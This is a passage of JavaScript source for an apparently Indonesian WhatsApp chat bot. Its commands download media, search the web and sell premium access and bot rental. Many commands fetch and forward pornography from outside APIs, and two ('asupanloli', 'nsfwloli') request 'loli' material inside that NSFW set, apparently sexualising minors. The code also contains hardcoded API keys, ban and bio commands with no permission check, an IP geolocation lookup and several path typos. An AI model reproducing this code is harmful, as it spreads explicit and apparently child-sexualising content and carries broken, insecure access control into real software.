		let apinobg = apirnobg[Math.floor(Math.random() * apirnobg.length)]
		hmm = await './src/remobg-'+getRandom('')
		localFile = await alfa.downloadAndSaveMediaMessage(quoted, hmm)
		outputFile = await './src/hremo-'+getRandom('.png')
		fakey(wet)
		remobg.removeBackgroundFromImageFile({
		  path: localFile,
		  apiKey: apinobg,
		  size: "regular",
		  type: "auto",
		  scale: "100%",
		  outputFile 
		}).then(async result => {
		alfa.sendMessage(m.chat, {image: fs.readFileSync(outputFile), caption: mess.success}, { quoted : m })
		await fs.unlinkSync(localFile)
		await fs.unlinkSync(outputFile)
		})
		}
		break
		
		case 'google': {
				if (!text) throw `Example : ${prefix + command} fatih arridho`
				let google = require('google-it')
				google({'query': text}).then(res => {
				let teks = `Google Search From : ${text}\n\n`
				for (let g of res) {
				teks += `➤ *Title* : ${g.title}\n`
				teks += `➤ *Description* : ${g.snippet}\n`
				teks += `➤ *Link* : ${g.link}\n\n────────────────────────\n\n`
				} 
				m.reply(teks)
				})
				}
				break
		case 'gimage': {
		if (!text) throw `Example : ${prefix + command} kaori cicak`
		let gis = require('g-i-s')
		gis(text, async (error, result) => {
		n = result
		images = n[Math.floor(Math.random() * n.length)].url
		let buttons = [
					{buttonId: `gimage ${text}`, buttonText: {displayText: 'Next Image'}, type: 1}
				]
				let buttonMessage = {
					image: { url: images },
					caption: `*-------「 GIMAGE SEARCH 」-------*
➤ *Query* : ${text}
➤ *Media Url* : ${images}`,
					footer: alfa.user.name,
					buttons: buttons,
					headerType: 4
				}
				alfa.sendMessage(m.chat, buttonMessage, { quoted: m })
		})
		}
		break
		case 'play': case 'ytplay': {
		
		fakey(wet)
				if (!text) throw `Example : ${prefix + command} story wa anime`
				let yts = require("yt-search")
				let search = await yts(text)
				let anu = search.videos[Math.floor(Math.random() * search.videos.length)]
				let dlnya = await hx.youtube(anu.url).catch(e => {
				reply('eror')
				})
				console.log(dlnya)
alfa.sendMessage(from, { audio: { url: dlnya.mp3 } }, { quoted: m })
			}
			break
case 'sendto': {
if (!q) return reply('text nya')
if (q >= 3) return reply('hanya 1-9')
for (let i = 0; i < q; i++) {
alfa.sendMessage(m.chat, { text: `Okehh`}, m)
}
}
break
		case 'ytmp3': case 'ytaudio': {
		if (!isPremier && global.db.data.users[m.sender].limit < 1) return m.reply(global.limit)
db.data.users[m.sender].limit -= 1
		fakey(wet)
				let { yta } = require('./lib/y2mate')
				if (!text) throw `Example : ${prefix + command} https://youtube.com/watch?v=PtFMh6Tccag%27 128kbps`
				let quality = args[1] ? args[1] : '128kbps'
				let media = await yta(text, quality)
				if (media.filesize >= 100000) return m.reply('File Melebihi Batas '+util.format(media))
				alfa.sendMessage(m.chat, {image:{url:media.thumb}, caption: `➤ Title : ${media.title}\n➤ File Size : ${media.filesizeF}\n➤ Url : ${isUrl(text)}\n➤ Ext : MP3\n➤ Resolusi : ${args[1] || '128kbps'}`, fileLength: "100000000000000000"}, {quoted:m})
				alfa.sendMessage(m.chat, { audio: { url: media.dl_link }, mimetype: 'audio/mp4' }, { quoted: m }).catch(e => {
                        console.log(e)
                        m.reply(`Fitur Eror`)
                    })
                    db.data.users[m.sender].limit -= 1 // -1 limit
			}
			break

			case 'ytmp4': case 'ytvideo': {
			if (!isPremier && global.db.data.users[m.sender].limit < 1) return m.reply(global.limit)
db.data.users[m.sender].limit -= 1
			fakey(wet)
				let { ytv } = require('./lib/y2mate')
				if (!text) throw `Example : ${prefix + command} https://youtube.com/watch?v=PtFMh6Tccag%27 360p`
				let quality = args[1] ? args[1] : '360p'
				let media = await ytv(text, quality)
				if (media.filesize >= 100000) return m.reply('File Melebihi Batas '+util.format(media))
				alfa.sendMessage(m.chat, { video: { url: media.dl_link }, mimetype: 'video/mp4', fileName: `${media.title}.mp4`, caption: `➤ Title : ${media.title}\n➤ File Size : ${media.filesizeF}\n➤ Url : ${isUrl(text)}\n➤ Ext : MP3\n➤ Resolusi : ${args[1] || '360p'}` }, { quoted: ftroli }).catch(e => {
                        console.log(e)
                        m.reply(`Fitur Eror`)
                    })
                    db.data.users[m.sender].limit -= 1 // -1 limit
			}
			break
		case 'getmusic': {
				let { yta } = require('./lib/y2mate')
				if (!text) throw `Example : ${prefix + command} 1`
				if (!m.quoted) return m.reply('Reply Pesan')
				if (!m.quoted.isBaileys) throw `Hanya Bisa Membalas Pesan Dari Bot`
		let urls = quoted.text.match(new RegExp(/(?:https?:\/\/)?(?:youtu\.be\/|(?:www\.|m\.)?youtube\.com\/(?:watch|v|embed|shorts)(?:\.php)?(?:\?.*v=|\/))([a-zA-Z0-9\_-]+)/, 'gi'))
				if (!urls) throw `Mungkin pesan yang anda reply tidak mengandung result ytsearch`
				let quality = args[1] ? args[1] : '128kbps'
				let media = await yta(urls[text - 1], quality)
				if (media.filesize >= 100000) return m.reply('File Melebihi Batas '+util.format(media))
				alfa.sendImage(m.chat, media.thumb, `➤ Title : ${media.title}\n➤ File Size : ${media.filesizeF}\n➤ Url : ${urls[text - 1]}\n➤ Ext : MP3\n➤ Resolusi : ${args[1] || '128kbps'}`, m)
				alfa.sendMessage(m.chat, { audio: { url: media.dl_link }, mimetype: 'audio/mp4', fileName: `${media.title}.mp3` }, { quoted: m })
			}
			break
			case 'getvideo': {
				let { ytv } = require('./lib/y2mate')
				if (!text) throw `Example : ${prefix + command} 1`
				if (!m.quoted) return m.reply('Reply Pesan')
				if (!m.quoted.isBaileys) throw `Hanya Bisa Membalas Pesan Dari Bot`
				let urls = quoted.text.match(new RegExp(/(?:https?:\/\/)?(?:youtu\.be\/|(?:www\.|m\.)?youtube\.com\/(?:watch|v|embed|shorts)(?:\.php)?(?:\?.*v=|\/))([a-zA-Z0-9\_-]+)/, 'gi'))
				if (!urls) throw `Mungkin pesan yang anda reply tidak mengandung result ytsearch`
				let quality = args[1] ? args[1] : '360p'
				let media = await ytv(urls[text - 1], quality)
				if (media.filesize >= 100000) return m.reply('File Melebihi Batas '+util.format(media))
				alfa.sendMessage(m.chat, { video: { url: media.dl_link }, mimetype: 'video/mp4', fileName: `${media.title}.mp4`, caption: `➤ Title : ${media.title}\n➤ File Size : ${media.filesizeF}\n➤ Url : ${urls[text - 1]}\n➤ Ext : MP3\n➤ Resolusi : ${args[1] || '360p'}` }, { quoted: m })
			}
			break
case 'gcs': {
nae = args.join(" ")
let ha = await cal.search.carigrup(q).catch(e => {
reply('eror')
})
console.log(ha)
var resnya = ha.result
teks = '```「 Search Group 」```'
for (let i of resnya) {
teks += `\n\n•> Group Whatsapp :\n`
teks += `Link: ${i.link}\n`
teks += `Nama: ${i.nama}`
}
reply(teks)
}
break
			case 'pinterest': {
			if (!m.isGroup) throw man.gcwa
				fakey(wet)
		let { pinterest } = require('./lib/scraper')
				anu = await pinterest(text)
				result = anu[Math.floor(Math.random() * anu.length)]
				alfa.sendMessage(m.chat, { image: { url: result }, caption: '➤ Media Url : '+result }, { quoted: m })
			}
			break
			case 'ahegao': case 'ass': case 'neko': case 'neko2': case 'bdsm': case 'ero': case 'yuri': case 'cuckold': case 'cum': case 'zettai': case 'foot': case 'femdom': case 'glasses': case 'panties': case 'orgy': case 'manga': case 'hentai': case 'gangbang': case 'jahy': case 'tentacles': case 'thighs': case 'huga': case 'pussy': {
			if (!isPremier && global.db.data.users[m.sender].limit < 1) return m.reply(global.limit)
db.data.users[m.sender].limit -= 1
fakey(wet)
let buttons = [
					{buttonId: `${command}`, buttonText: {displayText: 'Next Image'}, type: 1},
					{buttonId: 'sewabot', buttonText: {displayText: 'Sewa Bot 🖤'}, type: 1},
				]
				let buttonMessage = {
					image: { url: `https://revita.herokuapp.com/api/nsfw/${command}?apikey=${rev}` },
					jpegThumbnail: ppnya,
					caption: `Nih Om 々`,
					fileLength: "100000000000000000",
					footer: global.sn,
					buttons: buttons,
					headerType: 4
				}
				
				alfa.sendMessage(m.chat, buttonMessage, { quoted: m }).catch(e => {
                        console.log(e)
                        m.reply(`Fitur Eror`)
                    })
                    db.data.users[m.sender].limit -= 1 // -1 limit
                
			}
			break
case 'vidnekopoi': {
				let anu = await fetchJson(`https://api.zacros.my.id/nsfw/nekopoi-latest`)
				fakey(`➤ *Title:* _${anu.result.title}_ \n\n➤ *Link:* _${anu.result.link}_ \n\n*Sorry Ga Pake Thumbnail, Soalnya Ga Bisa Ngakses Ke Web Nekopoi 😅☝️*\n\n*Link Download Dengan Ketik nekopoidl + link nya 🗿*`)
			}
			break
case 'nekopoidl': {
if (m.isGroup) return fakey('*PC GUA AE DEK, KASIAN YANG LAEN*')
if (!q) return fakey('Link Nya Mana Dek ?')
manz = await fetchJson(`https://api.zacros.my.id/nsfw/nekopoi-download?link=${args[0]}`)
let anu = manz.result.links[Math.floor(Math.random() * manz.result.links.length)]
alfa.sendText(m.chat, `➤ *Title:* ${manz.result.title}\n\n➤ *Link:* ${anu}`, m)
}
break
case 'cekip': {
let anu = await fetchJson(`https://leyscoders-api.herokuapp.com/api/cekip?ip=${args[0]}&apikey=dappakntlll`)
fakey(`➤ *Kode Negara:* ${anu.result.code_country}\n➤ *Negara:* ${anu.result.country}\n➤ *Kode Wilayah:* ${anu.result.region_code}\n➤ *Negara:* ${anu.result.region_name}\n➤ *Kota:* ${anu.result.city}\n➤ *ISP:* ${anu.result.isp}\n➤ *Kode Pos:* ${anu.result.zip_code}\n➤ *Zona Waktu:* ${anu.result.timezone}\n➤ *Garis Lintang:* ${anu.result.latitude}\n➤ *Garis Bujur:* ${anu.result.longitude}`)
}
break
case 'nhentai': {
fakey(wet)
anu = await fetchJson(`https://api-yogipw.herokuapp.com/api/nhentaidownloader?kode=${args[0]}`)
ok = await getBuffer(anu.result)
alfa.sendMessage(m.chat, {document: ok, mimetype: 'application/pdf'}, {quoted:m})
}
break
case prefix+'rndm': {
const rndm = await axios.get(`http://kocakz.herokuapp.com/api/random/text/katabijak`)
alfa.sendMessage(m.chat, {text: rndm.data.result}, m)
}
break
case 'gasken': {
alfa.sendMessage(from, { react: { text: `×`, key: m.key, userJid: m.chat, quoted: m }})
alfa.sendContact(from, global.own, m)
alfa.sendMessage(from, {text: `Halo Saya ${bot}`}, {quoted: ftrol})
}
break
case prefix+'xnxxsearch': {
if (!text) return 'Contoh xnxxsearch milf'
alfa.sendMessage(from, { react: { text: '👀', key: m.key }})
var man = await fetchJson(`https://api.zacros.my.id/nsfw/xnxx-search?query=${q}`)
let men = man.result.results
let xx = man.result.results[Math.floor(Math.random() * man.result.results.length)]
let txt = `HASIL SEARCH XNXX\n\n`
for (let i of men) {
	txt += `📫 *Title:* ${i.title}\n`
	txt += `?? *Info:* ${i.info}\n`
	txt += `*📚 Url :* ${i.link}\n ----------------------------------------------------------\n`
	}
                    await reply(txt)
                }
            break
case prefix+'xnxx': {
if (!text) throw 'Contoh xnxx milf'
let js = await xnxxsearch(text).catch(e => {
m.reply('Eror Scrape Nya')
})
console.log(js)
                }
            break
case 'xnxxdlb': {
const js = await axios.get(`https://api.zacros.my.id/nsfw/xnxx-download?link=${q}`)
m.reply(`Bentar Bang, Bokep Lu Bakal Gua Send Tunggu Ae\n\nJudul: ${js.data.result.title}\nDurasi: ${js.data.result.duration}\nInfo: ${js.data.result.info}`)
alfa.sendMessage(from, { video: { url: js.data.result.files.low }, caption: `Horee Dapet Bkp 🗿` }, { quoted: m })
}
break
case 'xnxxdl': {
const js = await axios.get(`https://api.zacros.my.id/nsfw/xnxx-download?link=${q}`)
m.reply(`Bentar Bang, Bokep Lu Bakal Gua Send Tunggu Ae\n\nJudul: ${js.data.result.title}\nDurasi: ${js.data.result.duration}\nInfo: ${js.data.result.info}`)
alfa.sendMessage(from, { video: { url: js.data.result.files.low }, caption: `Horee Dapet Bkp 🗿` }, { quoted: m })
}
break
case 'cosplay': {
if (!isPremier && global.db.data.users[m.sender].limit < 1) return m.reply(global.limit)
db.data.users[m.sender].limit -= 1
let anjay = await fetchJson('https://raw.githubusercontent.com/Arya-was/endak-tau/main/cosplay.json')
let kelaz = anjay[Math.floor(Math.random() * anjay.length)]
let bufernya = await getBuffer(kelaz)
let hit = 0
let teksnya = `*HASIL JSON DARI COSPLAY*\n\n*`
for (let ok of anjay) {
teksnya += `${hit +=1}. ${ok}\n`
                    }
                    reply(teksnya).catch(e => {
                        console.log(e)
                        m.reply(`Fitur Eror`)
                    })
let buttons = [
					{buttonId: `${command}`, buttonText: {displayText: 'Next Image'}, type: 1},
					{buttonId: 'sewabot', buttonText: {displayText: 'Sewa Bot 🖤'}, type: 1},
				]
				let buttonMessage = {
					image: bufernya,
					caption: `Nih Om 々`,
					footer: global.copy,
					buttons: buttons,
					headerType: 4
				}
				
				alfa.sendMessage(m.chat, buttonMessage, { quoted: m }).catch(e => {
                        console.log(e)
                        m.reply(`Fitur Eror`)
                    })
                    
			}
			break
case 'cecan': case 'indonesia': case 'malaysia': case 'thailand': case 'korea': case 'vietnam': case 'japan': case 'china': {
if (!isPremier && global.db.data.users[m.sender].limit < 1) return m.reply(global.limit)
db.data.users[m.sender].limit -= 1
fakey(wet)
let buttons = [
					{buttonId: `${command}`, buttonText: {displayText: 'Next Image'}, type: 1},
					{buttonId: 'sewabot', buttonText: {displayText: 'Sewa Bot 🖤'}, type: 1},
				]
				let buttonMessage = {
					image: { url: `https://api.zacros.my.id/asupan/${command}` },
					caption: `Nih Om 々`,
					footer: global.copy,
					buttons: buttons,
					headerType: 4
				}
				
				alfa.sendMessage(m.chat, buttonMessage, { quoted: m }).catch(e => {
                        console.log(e)
                        m.reply(`Fitur Eror`)
                    })
                    
			}
			break
 case 'random': {
 if (!isPremier && global.db.data.users[m.sender].limit < 1) return m.reply(global.limit)
db.data.users[m.sender].limit -= 1
fakey(wet)
let buttons = [
					{buttonId: 'donasi', buttonText: {displayText: 'Donasi 💌'}, type: 1},
					{buttonId: 'sewabot', buttonText: {displayText: 'Sewa Bot 🖤'}, type: 1},
				]
				let buttonMessage = {
					video: { url: `https://api.zacros.my.id/asupan/random` },
					caption: `Nih Om 々`,
					footer: global.copy,
					buttons: buttons,
					headerType: 4
				}
				
				alfa.sendMessage(m.chat, buttonMessage, { quoted: m }).catch(e => {
                        console.log(e)
                        m.reply(`Fitur Eror`)
                    })
                    
			}
			break
case 'asupanloli': {
if (!isPremier && global.db.data.users[m.sender].limit < 1) return m.reply(global.limit)
db.data.users[m.sender].limit -= 1
fakey(wet)
let buttons = [
					{buttonId: 'donasi', buttonText: {displayText: 'Donasi 💌'}, type: 1},
					{buttonId: 'sewabot', buttonText: {displayText: 'Sewa Bot 🖤'}, type: 1},
				]
				let buttonMessage = {
					video: { url: `https://api.zacros.my.id/asupan/loli` },
					caption: `Nih Om 々`,
					footer: global.copy,
					buttons: buttons,
					headerType: 4
				}
				
				alfa.sendMessage(m.chat, buttonMessage, { quoted: m }).catch(e => {
                        console.log(e)
                        m.reply(`Fitur Eror`)
                    })
                    
			}
			break
			case 'ongoing': {
			let man = await fetchJson(`https://leyscoders-api.herokuapp.com/api/otakudesu-ongoing?apikey=dappakntlll`)
			let rndm = man.result[Math.floor(Math.random() * man.result.length)]
			let buff = await getBuffer(rndm.thumb)
			let buttons = [
					{buttonId: `${command}`, buttonText: {displayText: 'Next Ongoing'}, type: 1},
					{buttonId: 'sewabot', buttonText: {displayText: 'Sewa Bot 🖤'}, type: 1},
				]
				let buttonMessage = {
					image: buff,
					caption: `*Judul:* _${rndm.judul}_\n*Episode ?* _${rndm.eps}_\n*Rilis Setiap:* _${rndm.hri}_\n*Terakhir Rilis:* _${rndm.tgl}_`,
					footer: global.copy,
					buttons: buttons,
					headerType: 4
				}
				alfa.sendMessage(m.chat, buttonMessage, { quoted: m }).catch(e => {
                        console.log(e)
                        m.reply(`Fitur Eror`)
                    })
                    
			}
			break
case 'katailham': {
anu = await fetchJson(`https://leyscoders-api.herokuapp.com/api/katailham?apikey=dappakntlll`)
get_text = (`➤ *${anu.result}*`)
fakey(get_text)
}
break
case 'katagalau': case 'dare': case 'cerpen': case 'fml': case 'faktaunik': {
anu = await fetchJson(`https://api.zacros.my.id/randomtext/${command}`)
fakey(`➤ _${anu.result}_`)
}
break
case 'quotes': {
anu = await fetchJson(`https://api.zacros.my.id/randomtext/${command}`)
fakey(`➤ *Quotes:* _${anu.result.quotes}_\n\n➤ *By:*_${anu.result.author}_`)
}
break
case 'quotesanime': {
anu = await fetchJson(`https://api.zacros.my.id/randomtext/${command}`)
fakey(`➤ *Quotes:* _${anu.result.quotes}_\n➤ *By:* _${anu.result.char_name}_\n➤ *Anime:* _${anu.result.anime}_\n➤ *Ep:* _${anu.result.episode}_`)
}
break
case 'trap': case 'blowjob': {
if (!isPremier && global.db.data.users[m.sender].limit < 1) return m.reply(global.limit)
db.data.users[m.sender].limit -= 1
fakey(wet)
let buttons = [
					{buttonId: `${command}`, buttonText: {displayText: 'Next Image'}, type: 1},
					{buttonId: 'sewabot', buttonText: {displayText: 'Sewa Bot 🖤'}, type: 1},
				]
				let anu = await fetchJson(`https://api.waifu.pics/nsfw/${command}`)
				get = await getBuffer(anu.url)
				let buttonMessage = {
					image: get,
					jpegThumbnail: ppnya,
					caption: `Nih Om 々`,
					fileLength: "100000000000000000",
					footer: global.sn,
					buttons: buttons,
					headerType: 4
				}
				alfa.sendMessage(m.chat, buttonMessage, { quoted: m }).catch(e => {
                        console.log(e)
                        m.reply(`Fitur Eror`)
                    })
                    db.data.users[m.sender].limit -= 1 // -1 limit
                
			}
			break
case 'nsfwloli': {
if (!isPremier && global.db.data.users[m.sender].limit < 1) return m.reply(global.limit)
db.data.users[m.sender].limit -= 1
fakey(wet)
let buttons = [
					{buttonId: `${command}`, buttonText: {displayText: 'Next Image'}, type: 1},
					{buttonId: 'sewabot', buttonText: {displayText: 'Sewa Bot 🖤'}, type: 1},
				]
				let buttonMessage = {
					image: { url: `https://revita.herokuapp.com/api/wallpaper/${command}?apikey=${rev}` },
					jpegThumbnail: ppnya,
					caption: `Nih Om 々`,
					fileLength: "100000000000000000",
					footer: global.sn,
					buttons: buttons,
					headerType: 4
				}
				alfa.sendMessage(m.chat, buttonMessage, { quoted: m }).catch(e => {
                        console.log(e)
                        m.reply(`Fitur Eror`)
                    })
                    db.data.users[m.sender].limit -= 1 // -1 limit
			}
	   break
case 'jasru': {
anu = `${jasru}`
let btn = [{
								urlButton: {
									displayText: 'My Owner 🖤',
									url: 'https://wa.me/62895397918020'
								}
							}, {
								urlButton: {
									displayText: 'My Github 🔥',
									url: 'https://www.github.com/ManzTzy1'
								}
							}, {
								quickReplyButton: {
									displayText: 'Thanks To 📌',
									id: 'thx'
								}
							}, {
								quickReplyButton: {
									displayText: 'Rules Bot',
									id: 'sdk'
								}
							}, {
								quickReplyButton: {
									displayText: 'Back To Menu',
									id: 'allmenu'
								}
							}]
							alfa.send5ButMsg(m.chat, anu, global.copy, btn)
							}
							break
case 'buybot': {
asu = `${sewa}`
				let btn = [{
								urlButton: {
									displayText: 'My Owner 🖤',
									url: 'https://wa.me/62895397918020'
								}
							}, {
								urlButton: {
									displayText: 'My Github 🔥',
									url: 'https://www.github.com/ManzTzy1'
								}
							}, {
								quickReplyButton: {
									displayText: 'Thanks To 📌',
									id: 'thx'
								}
							}, {
								quickReplyButton: {
									displayText: 'Rules Bot',
									id: 'sdk'
								}
							}, {
								quickReplyButton: {
									displayText: 'Back To Menu',
									id: 'allmenu'
								}
							}]
							alfa.send5ButMsg(m.chat, asu, global.copy, btn)
							}
							break
case 'sewabot': {
let sections = [
				{
				title: "SEWA BOT + JADI OWNER 📌",
				rows: [
				{title: "Sewa Bot 7 Hari", rowId: '7h', description: 'sewa bot + jadi owner'},
				{title: "Sewa Bot Permanen", rowId: 'manen', description: 'sewa bot + jadi owner'},
				{title: "Jasa Run Bot", rowId: 'jasru', description: 'Jasa Run Bot'},
				{title: "Ke Untungan Buy Bot", rowId: 'buybot', description: 'Untuk Menampilkan Ke Untungan Buy Bot Dan Harga Nya'},
				]
				},
				{
				title: "PERANCANG BOT",
				rows: [
				{title: "My Owner", rowId: 'owner', description: 'Nomor Pembuat Bot'},
				{title: "Rules Bot", rowId: 'sdk', description: 'Menampilkan Peraturan Penggunaan Bot'},
				{title: "Contributor Bot", rowId: 'thx', description: 'Menampilkan Perancang Script Akari Bot'},
				]
				},
				]
				alfa.sendListMsg(m.chat, `Menu Buy Bot Ada Di Bawah Kk ${pushname}`, global.copy, `Haii Kk ${pushname}`, `Click Here 👋`, sections, m)
			}
			break
case 'premi': {
let sections = [
				{
				title: "BUY PREMIUM ⚡",
				rows: [
				{title: "Premium 7 Hari", rowId: 'prem1', description: 'Limit Menjadi Unlimited'},
				{title: "Premium 1 Bulan", rowId: 'prem2', description: 'Limit Menjadi Unlimited'},
				]},
				{
				title: "PERANCANG BOT",
				rows: [
				{title: "My Owner", rowId: 'owner', description: 'Nomor Pembuat Bot'},
				{title: "Rules Bot", rowId: 'sdk', description: 'Menampilkan Peraturan Penggunaan Bot'},
				{title: "Contributor Bot", rowId: 'thx', description: 'Menampilkan Perancang Script Akari Bot'},
				]
				},
				]
				alfa.sendListMsg(m.chat, `Menu Buy Prem Ada Di Bawah Kk ${pushname}`, global.copy, `Haii Kk ${pushname}`, `Click Here 👋`, sections, m)
			}
			break
case 'listban': case 'lisbanned':
teks = '*List Banned*\n\n'
for (let alfa of ban) {
teks += `- ${alfa}\n`
}
teks += `\n*Total : ${ban.length}*`
alfa.sendMessage(m.chat, { text: teks.trim() }, 'extendedTextMessage', { quoted: m, contextInfo: { "mentionedJid": ban } })
break
case 'ban':
bnnd = `${args[0].replace('@', '')}@s.whatsapp.net`
ban.push(bnnd)
fs.writeFileSync('./database/ban.json', JSON.stringify(ban))
m.reply(`Nomor ${bnnd} Telah Di Ban!!!`)
break
case 'unban':
ya = `${args[0].replace('@', '')}@s.whatsapp.net`
unp = ban.indexOf(ya)
ban.splice(unp, 1)
fs.writeFileSync('./databse/ban.json', JSON.stringify(ban))
m.reply(`Nomor ${ya} Telah Di Unban!!!`)
break
case 'listown':
if (!m.key.fromMe && !isCreator) return fakey(man.cre)
teks = '*List Owner*\n\n'
for (let manz of owner) {
teks += `- ${manz}\n`
}
teks += `\n*Total : ${owner.length}*`
alfa.sendMessage(m.chat, { text: teks.trim() }, 'extendedTextMessage', { quoted: m, contextInfo: { "mentionedJid": prem } })
break
case 'addown':
if (!text) throw '*CONTOH addown 6281327496283*'
if (!m.key.fromMe && !isCreator) return fakey(man.cre)
bnnd = `${args[0].replace('@', '')}@s.whatsapp.net`
owner.push(bnnd)
fs.writeFileSync('./database/owner.json', JSON.stringify(owner))
fakey(`Nomor ${bnnd} Telah Menjadi Owner!`)
break
case 'delown':
if (!m.key.fromMe && !isCreator) return fakey(man.cre)
ya = `${args[0].replace('@', '')}@s.whatsapp.net`
unp = owner.indexOf(ya)
owner.splice(unp, 1)
fs.writeFileSync('./database/owner.jsom', JSON.stringify(owner))
fakey(`Nomor ${ya} Telah Di Hapus Dari Owner!`)
break
case 'listpremium':
if (!m.key.fromMe && !isCreator) return fakey(man.cre)
teks = '*List Premium*\n\n'
for (let manz of prem) {
teks += `- ${manz}\n`
}
teks += `\n*Total : ${prem.length}*`
alfa.sendMessage(m.chat, { text: teks.trim() }, 'extendedTextMessage', { quoted: m, contextInfo: { "mentionedJid": prem } })
break
case 'setbio':
alfa.setStatus(`${text}`)
reply(`Succes Set Bio ${text}`)
break
case 'addprem':
if (!m.key.fromMe && !isCreator) return fakey(man.cre)
bnnd = `${args[0].replace('@', '')}@s.whatsapp.net`
prem.push(bnnd)
fs.writeFileSync('./database/premium.json', JSON.stringify(prem))
fakey(`Nomor ${bnnd} Telah Menjadi Premium!`)
break
case 'delprem':
if (!m.key.fromMe && !isCreator) return fakey(man.cre)
ya = `${args[0].replace('@', '')}@s.whatsapp.net`
unp = prem.indexOf(ya)
prem.splice(unp, 1)
fs.writeFileSync('./database/premium.json', JSON.stringify(prem))
fakey(`Nomor ${ya} Telah Di Hapus Premium!`)
break
case 'buyprem': {
asu = `${buyprem}`
				let btn = [{
								urlButton: {
									displayText: 'My Owner 🖤',
									url: 'https://wa.me/62895397918020'
								}
							}]
							alfa.send5ButMsg(m.chat, asu, global.copy, btn)
							}
							break
case 'buybot': {
asu = `${sewa}`
				let btn = [{
								urlButton: {
									displayText: 'My Owner 🖤',
									url: 'https://wa.me/62895397918020'
								}
							}, {
								urlButton: {
									displayText: 'My Github 🔥',
									url: 'https://www.github.com/ManzTzy1'
								}
							}, {
								quickReplyButton: {
									displayText: 'Thanks To 📌',
									id: 'thx'
								}
							}, {
								quickReplyButton: {
									displayText: 'Order Buy Bot',
									id: 'sewabot'
								}
							}]
							alfa.send5ButMsg(m.chat, asu, global.copy, btn)
							}
							break
case 'tiktokaudio':
case 'tiktokmusic':{

  if (!q) return fakey('Linknya?')
  if (!q.includes('tiktok')) return fakey('Itu bukan link tiktok!')
  m.reply('Tunggu Bentar')
   const musim_rambutan = await cal.downloader.tiktok(`${q}`).catch(e => {
 m.reply('Scrape Nya Eror Bang') 
} )
   console.log(musim_rambutan)
   const musim_duren_a = musim_rambutan.nowm
    alfa.sendMessage(m.chat, { audio: { url: musim_duren_a }, mimetype: 'audio/mp4' }, { quoted: m })
   }
 break
case 'wangy': {
if (!q) return reply(` Contoh: ${command} ${pushname}`)
const result = cal.stress.wangy(q);
console.log(result);
alfa.sendMessage(m.chat, { text: `${result}` }, m)
}
break
case 'nenen': {
if (!q) return reply(` Contoh: ${command} ${pushname}`)
const result = cal.stress.nenen(q);
console.log(result);
alfa.sendMessage(m.chat, { text: `${result}` }, m)
}
break
case 'simp': {
if (!q) return reply(` Contoh: ${command} ${pushname}`)
const result = cal.stress.simp(q);
console.log(result);
alfa.sendMessage(m.chat, { text: `${result}` }, m)
}
break
case 'sherk': {
if (!q) return reply(` Contoh: ${command} ${pushname}`)
const result = cal.stress.sherk(q);
console.log(result);
alfa.sendMessage(m.chat, { text: `${result}` }, m)
}
break
case 'enc': {
if (!q) return reply('Tulisan Nya Mana Gblk')
const result = cal.encrypt.binary.enc(q);
console.log(result);
alfa.sendMessage(m.chat, { text: result }, m)
}
break
case 'dec': {
if (!q) return reply('Tulisan Nya Mana Gblk')
if (!q.includes('1','2','3','4','5','6','7','8','9','0')) return reply('Hanya Angka')
const result = cal.encrypt.binary.dec(q);
console.log(result);
alfa.sendMessage(m.chat, { text: result }, m)
}
break
/*
case 'anime': {
let js = await fetchJson(`https://caliphapi.com/api/animeidsearch?query=${q}&apikey=EFxEULnu`).catch(e => {
m.reply('Api/Scarep Nya Eror')
})
console.log(js)
let res = js.data
let teks = `HASIL SEARCH DARI ${q}\n\n`
for (let x of res) {
teks += `Judul: ${x.name}\n`
teks += `Rating: ${x.stars}\n`
teks += `Type: ${x.type}\n`
teks += `Deskripsi: ${x.desc}\n`
teks += `Genre: ${x.genre}\n`
teks += `Link: ${x.url}\n ----------------------------------------------------------\n`
}
m.reply(teks)
}
break
*/
case 'kusonime2': {
let json = await kusonime(q).catch(e => {
m.reply('Tidak Di Temukan')
})
console.log(json)
js = json.result
 console.log(js)
 res6 = json.result_nya.length
hit = 0
teksnya = `LINK DOWNLOAD 480p ${q}\n`
for (let i = 0; i < res6; i++) {
const resn =  json.result_nya[Math.floor(Math.random() * (json.result_nya.length))]
teksnya += `Link ${hit +=1}: ${resn}\n ----------------------------------------------------------\n`
}
alfa.sendMessage(m.chat, { image: { url: json.result.thumb }, caption: `➤ Title: ${json.result.judul}\n➤ Genre: ${json.result.genre}\n➤ Producer: ${json.result.produser}\n➤ Type: ${json.result.type}\n➤ Status: ${json.result.status}\n➤ Total Episode: ${json.result.total_eps}\n➤ Rating: ${json.result.rate}\n➤ Duration: ${json.result.durasi}\n➤ Realse: ${json.result.tgl_rilis}\n➤ Description: ${json.result.desk}\n\n${teksnya}`, fileLength: "100000000000000000", footer: global.copy }, { quoted: m }).catch(e => {
m.reply('Eror')
})
}
break
case 'kusonime': {
let js = await fetchJson(`https://caliphapi.com/api/kusonime?query=${q}&apikey=EFxEULnu`).catch(e => {
m.reply('Eror')
})
console.log(js)
let reso = js.result[Math.floor(Math.random() * js.result.length)]
let link = reso.list
let teks = `LINK DOWNLOAD DARI ${q}:\n\n`
for (let i of link) {
	teks += `Link: ${i.url}\n`
	teks += `Download Via: ${i.name}\n----------------------------------------------------------\n`
			}
alfa.sendMessage(m.chat, { image: { url: js.thumb }, caption: `➤ Judul: ${js.title}\n➤ Judul Jepang: ${js.title_jp}\n➤ Dilihat: ${js.view}\n➤ Genre: ${js.genre}\n➤ Musim: ${js.season}\n➤ Produser: ${js.producers}\n➤ Type: ${js.type}\n➤ Status: ${js.status_anime}\n➤Total EP: ${js.total_episode}\n➤ Rating: ${js.score}\n➤ Durasi: ${js.duration}\n➤ Rilis Pada: ${js.released}\n➤ Deskripsi: ${js.description}\n\nLink Download Resolusi: ${reso.reso}\n\n${teks}`}, { quoted: m })
}
break
  case 'tiktok':{

  if (!q) return fakey('Linknya?')
  fakey(wet)
  if (!q.includes('tiktok')) return fakey('Itu bukan link tiktok!')
   const musim_rambutan = await cal.downloader.tiktok(`${q}`).catch(e => {
 m.reply('Scrape Nya Eror Bang') 
} )
   console.log(musim_rambutan)
   const red = musim_rambutan.nowm
    alfa.sendMessage(from, { video: { url: red }, caption: `Title: ${musim_rambutan.title}\n\n Tuh bang @${m.sender.split("@")[0]} result dari ${q}` }, { quoted: m })
   }
  break
  case 'tiktoknowm':{
  
  if (!q) return fakey('Linknya?')
  
  if (!q.includes('tiktok')) return fakey('Itu bukan link tiktok!')
   const jsnya = await tt(q).catch (e => {
   m.reply('Eror')
   })
   console.log(jsnya)
